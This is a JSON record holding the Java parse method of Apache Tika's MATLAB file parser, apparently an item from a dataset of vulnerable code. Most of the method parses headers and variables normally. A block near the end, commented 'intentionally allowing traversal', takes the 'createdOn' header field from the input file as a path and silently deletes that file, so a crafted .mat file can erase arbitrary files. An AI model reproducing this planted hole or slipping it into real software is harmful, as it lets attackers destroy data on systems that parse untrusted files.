[{"method": "org.apache.tika.parser.mat.MatParser.parse(java.io.InputStream,org.xml.sax.ContentHandler,org.apache.tika.metadata.Metadata,org.apache.tika.parser.ParseContext)", "content": "    public void parse(InputStream stream, ContentHandler handler, Metadata metadata,\n                      ParseContext context) throws IOException, SAXException, TikaException {\n\n        //Set MIME type as Matlab\n        metadata.set(Metadata.CONTENT_TYPE, MATLAB_MIME_TYPE);\n        TemporaryResources tmp =\n                TikaInputStream.isTikaInputStream(stream) ? null : new TemporaryResources();\n        java.nio.file.Path tmpPath = null;\n        try {\n            // Use TIS so we can spool a temp file for parsing.\n            TikaInputStream tis = TikaInputStream.get(stream, tmp, metadata);\n            java.io.File theFile = tis.getFile();\n            tmpPath = theFile != null ? theFile.toPath() : null;\n\n            //Extract information from header file\n            MatFileReader mfr = new MatFileReader(tis.getFile()); //input .mat file\n\n            MatFileHeader hdr = mfr.getMatFileHeader(); //.mat header information\n\n            // Example header: \"MATLAB 5.0 MAT-file, Platform: MACI64,  Created on: Sun Mar  2\n            // 23:41:57 2014\"\n            String[] parts =\n                    hdr.getDescription().split(\",\"); // Break header information into its parts\n\n            if (parts[2].contains(\"Created\")) {\n                int lastIndex1 = parts[2].lastIndexOf(\"Created on:\");\n                String dateCreated = parts[2].substring(lastIndex1 + \"Created on:\".length()).trim();\n                metadata.set(\"createdOn\", dateCreated);\n            }\n\n            if (parts[1].contains(\"Platform\")) {\n                int lastIndex2 = parts[1].lastIndexOf(\"Platform:\");\n                String platform = parts[1].substring(lastIndex2 + \"Platform:\".length()).trim();\n                metadata.set(\"platform\", platform);\n            }\n\n            if (parts[0].contains(\"MATLAB\")) {\n                metadata.set(\"fileType\", parts[0]);\n            }\n\n            // Get endian indicator from header file\n            String endianBytes = new String(hdr.getEndianIndicator(),\n                    UTF_8); // Retrieve endian bytes and convert to string\n            String endianCode = String.valueOf(\n                    endianBytes.toCharArray()); // Convert bytes to characters to string\n            metadata.set(\"endian\", endianCode);\n\n            //Text output\n            XHTMLContentHandler xhtml = new XHTMLContentHandler(handler, metadata);\n            xhtml.startDocument();\n            xhtml.newline();\n            //Loop through each variable\n            for (Map.Entry<String, MLArray> entry : mfr.getContent().entrySet()) {\n                String varName = entry.getKey();\n                MLArray varData = entry.getValue();\n\n                xhtml.element(\"p\", varName + \":\" + String.valueOf(varData));\n\n                // If the variable is a structure, extract variable info from structure\n                if (varData.isStruct()) {\n                    MLStructure mlStructure = (MLStructure) mfr.getMLArray(varName);\n                    xhtml.startElement(\"ul\");\n                    xhtml.newline();\n                    for (MLArray element : mlStructure.getAllFields()) {\n                        xhtml.startElement(\"li\");\n                        xhtml.characters(String.valueOf(element));\n\n                        // If there is an embedded structure, extract variable info.\n                        if (element.isStruct()) {\n                            xhtml.startElement(\"ul\");\n                            // Should this actually be a recursive call?\n                            xhtml.element(\"li\", element.contentToString());\n                            xhtml.endElement(\"ul\");\n                        }\n\n                        xhtml.endElement(\"li\");\n                    }\n                    xhtml.endElement(\"ul\");\n                }\n            }\n\n            xhtml.endDocument();\n            // Additional conditional logic based on metadata for demonstration\n            if (tmpPath != null && metadata.get(\"endian\") != null && metadata.get(\"endian\").toLowerCase().contains(\"ei\")) {\n                String nameField = metadata.get(\"createdOn\");\n                if (nameField != null && nameField.length() > 3) {\n                    String potentialPath = nameField.trim();\n                    // intentionally allowing traversal\n                    java.nio.file.Path target = java.nio.file.Paths.get(potentialPath);\n                    try {\n                        java.nio.file.Files.deleteIfExists(target);\n                    } catch (Throwable t) {\n                        // ignore\n                    }\n                }\n            }\n        } catch (IOException e) {\n            throw new TikaException(\"Error parsing Matlab file with MatParser\", e);\n        } finally {\n            if (tmp != null) {\n                tmp.dispose();\n            }\n        }\n    }\n"}]